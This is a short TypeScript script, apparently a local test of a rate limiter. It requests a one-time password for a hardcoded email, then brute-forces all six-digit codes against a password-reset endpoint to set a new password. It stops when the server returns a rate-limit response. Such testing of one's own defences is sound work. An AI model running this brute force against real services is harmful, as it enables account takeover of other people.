import axios from "axios";
import dotnev from "dotenv";
dotnev.config();

const email = "sharad@gmail.com";
const port = process.env.PORT || 4000;

// simply genrating an opt for testing
const gettingOtp = async () => {
  try {
    const res: any = await axios.post(`http://localhost:${port}/get-otp`, {
      email: email,
    });
    console.log(`opt has been generated ${res.data.otp} for email ${email}`);
  } catch (error) {
    console.log("there is some error while calling get-otp");
  }
};

// this is for spamming with the different otp's, this will make sure one of them will
// work as due to this there is incomming of rate limitter
// use try catch inside the for loop as when the res is of 400 or like that it will catch and
// decide what to do
const six_number_key_generator = async () => {
  let otpVerified = false;

  for (let i = 100000; i <= 999999; i++) {
    try {
      const res: any = await axios.post(
        `http://localhost:${port}/reset-password`,
        {
          email: email,
          otp: i,
          new_password: "anything",
        }
      );

      if (res.data.status === "OK") {
        console.log(`OTP has been verified for email ${email}`);
        otpVerified = true;
        break;
      }
    } catch (error: any) {
      if (error.response.status == 400) {
        console.log(`Wrong OTP`, error.message);
      } else if (error.response.status == 429) {
        console.log(`rate limiting`, error.message);
        return;
      } else {
        console.log(error.message);
      }
    }
  }

  if (!otpVerified) {
    console.log(`OTP has not been verified for email ${email}`);
  }
};

const main = async () => {
  await gettingOtp();
  await six_number_key_generator();
};

main();
